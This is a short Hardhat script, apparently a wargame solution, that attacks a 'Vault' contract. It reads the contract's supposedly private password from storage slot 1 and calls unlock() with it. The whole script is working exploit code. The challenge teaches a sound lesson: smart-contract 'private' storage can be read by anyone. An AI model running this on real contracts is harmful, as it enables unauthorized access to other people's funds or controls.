import { ethers } from "hardhat";

const CONTRACT_NAME = "Vault";
const CONTRACT_ADDRESS = "0xB89930Eb9e5A9b2c04d9C00FaFc0ba74f6e9Ea9e";

async function hack() {
  const [wallet] = await ethers.getSigners();

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const storage = await wallet.provider?.getStorageAt(CONTRACT_ADDRESS, 1);
  if (storage) {
    console.log("Password : ", ethers.utils.toUtf8String(storage));

    const txAttacker = await contract.unlock(storage);
    console.log("txAttacker : ", txAttacker.hash);
    await txAttacker.wait();

    const contractLocked = await contract.locked();
    if (!contractLocked) console.log("🚀 Contract hacked");
    else console.log("❌ Contract not hacked");
  } else {
    console.log(
      "❌ Did not find storage blockchain corresponding to this contract"
    );
  }
}

hack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
